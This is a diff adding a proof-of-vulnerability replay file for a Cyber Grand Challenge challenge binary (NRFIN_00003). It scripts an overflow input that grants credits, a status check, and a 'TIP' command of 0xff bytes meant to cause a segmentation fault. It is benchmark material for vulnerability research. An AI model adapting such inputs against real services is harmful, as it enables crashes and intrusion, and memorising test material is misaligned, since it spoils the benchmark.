@@ -1,0 +1,36 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
+<pov>
+    <cbid>NRFIN_00003</cbid>
+    <replay>
+
+    	<!-- reliability -->
+        <delay>100</delay>
+
+        <!-- exploit to add credits -->
+        <write><data>SMORE AAAAAAAAAAAAAAAAAAAAA\n</data></write>
+        <read>
+            <delim>\r</delim>
+            <match>
+                <data format="asciic">here's a lil' bit\n</data>
+                <data format="asciic">-----------------\n</data>
+                <data format="asciic">requested file not found\n</data>
+            </match>
+        </read>
+
+        <!-- verify that we have credits -->
+        <write><data>STATUS\n</data></write>
+        <read>
+            <delim>\r</delim>
+            <match>
+                <data format="asciic">FASTLANE fully operational!\n</data>
+                <data format="asciic">Thank you for asking kind sir/madam!\n</data>
+            </match>
+        </read>
+
+        <!-- cause SIGSEGV -->
+        <write><data>TIP \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfd\n</data></write>
+        <read echo="ascii"><delim>\r</delim></read>
+
+    </replay>
+</pov>
